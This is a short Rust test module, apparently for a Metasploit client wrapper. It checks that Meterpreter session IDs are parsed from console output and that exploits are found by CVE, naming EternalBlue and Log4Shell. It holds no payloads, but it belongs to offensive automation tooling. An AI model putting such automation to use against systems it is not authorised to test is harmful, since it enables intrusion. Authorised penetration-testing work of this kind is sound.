mod tests {
    use super::*;

    #[test]
    fn test_session_id_extraction() {
        let output = "[*] Meterpreter session 3 opened (192.168.1.100:4444 -> 192.168.1.50:49152)";
        assert_eq!(extract_session_id(output), Some(3));
        
        let no_session = "No session opened";
        assert_eq!(extract_session_id(no_session), None);
    }

    #[tokio::test]
    async fn test_exploit_database_loading() {
        // Questo test funziona solo se MSF è installato
        if let Ok(client) = MetasploitClient::new(None) {
            assert!(!client.exploit_database.is_empty());
            
            // Verifica CVE comuni
            assert!(client.find_exploits_for_cve("CVE-2017-0144").len() > 0); // EternalBlue
            assert!(client.find_exploits_for_cve("CVE-2021-44228").len() > 0); // Log4Shell
        }
    }
}
